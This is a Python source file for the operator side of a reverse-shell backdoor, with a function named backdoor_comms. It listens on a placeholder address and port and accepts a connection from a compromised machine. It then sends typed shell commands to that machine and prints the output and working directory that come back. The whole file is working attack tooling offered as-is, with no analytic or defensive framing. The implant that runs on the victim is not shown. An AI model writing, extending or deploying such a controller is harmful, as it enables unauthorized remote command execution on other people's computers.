import socket
import sys

HOST = "000.000.000.000"
PORT = 1234
BUFFER = 2024
SEP = "<sep>"

def backdoor_comms(conn):
    try:
        cwd = conn.recv(BUFFER).decode()
        print(f"[+] Connection established from {addr[0]}:{addr[1]}")
        print("[+] Type 'exit' to close the connection")
        
        while True:
            command = input("").strip()
            
            if command.lower() == 'exit':
                print("[*] Closing connection...")
                break
                
            conn.send(command.encode())
            output = conn.recv(BUFFER).decode()
            
            try:
                results, cwd = output.split(SEP)
                print(results)
            except ValueError:
                print(output)
    except ConnectionResetError:
        print("[-] Connection was reset by the client")
    except Exception as exception:
        print(f"[-] Error in communication: {str(exception)}")
    finally:
        conn.close()


def main():
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_sock.bind((HOST, PORT))
        except socket.error as exception:
            print(f"[-] Bind failed: {str(exception)}")
            sys.exit()
            
        print(f"[+] Listening on {HOST}:{PORT}")
        server_sock.listen(1)
        
        while True:
            try:
                global addr
                conn, addr = server_sock.accept()
                backdoor_comms(conn)
            except KeyboardInterrupt:
                print("\n[-] Server shutdown requested")
                break
            except Exception as exception:
                print(f"[-] Error accepting connection: {str(exception)}")
                continue
            
    except Exception as exception:
        print(f"[-] Server error: {str(exception)}")
    finally:
        if 'server_sock' in locals():
            server_sock.close()
        print("[*] Server shutdown complete")


if __name__ == "__main__":
    main()
